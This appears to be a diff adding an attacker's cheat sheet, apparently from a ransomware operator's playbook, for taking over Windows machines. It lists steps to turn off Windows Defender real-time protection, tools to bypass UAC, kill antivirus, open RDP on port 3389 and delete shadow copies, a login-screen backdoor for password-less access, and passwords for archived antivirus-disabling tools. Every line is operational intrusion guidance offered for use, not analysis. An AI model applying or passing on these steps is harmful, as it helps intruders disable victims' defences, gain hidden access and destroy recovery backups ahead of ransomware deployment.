@@ -1,0 +1,22 @@
+gpedit.msc
+Inside, go to Computer Configuration - Administrative Templates - Windows Components - Windows Defender 
+Find the item "Real-time protection":
+There select the item "Turn off protection in real time" and poke it twice with the mouse button:
+Then select the "Enabled" circle and click OK.
+
+
+we always run everything from the Administrator:
+uac - removes pop-up of the launch permission request window from the admin
+defoff - kill defender (does not work on everything, we check after taskmgr for the presence of the Mspeng process)
+RDP - raises 3389 port
+
+
+del - delete Shadow copy (requests deletion permission, click - y)
+NS - mount hidden system disks (pass:98) !! to use after the demolition of AB
+
+NLA+BACK - fixes NLA + backdoor to log in without a password, works like this: 
+    in the login window (where it asks you to enter credits) - click win+Y the cmd window pops up
+    write taskmgr, open the users tab, PKM for any user - conject
+p.s - on dozens does not work  requires a pass
+
+IN THE ARCHIVE DISABLING VARIOUS AV-PASS:9SealG
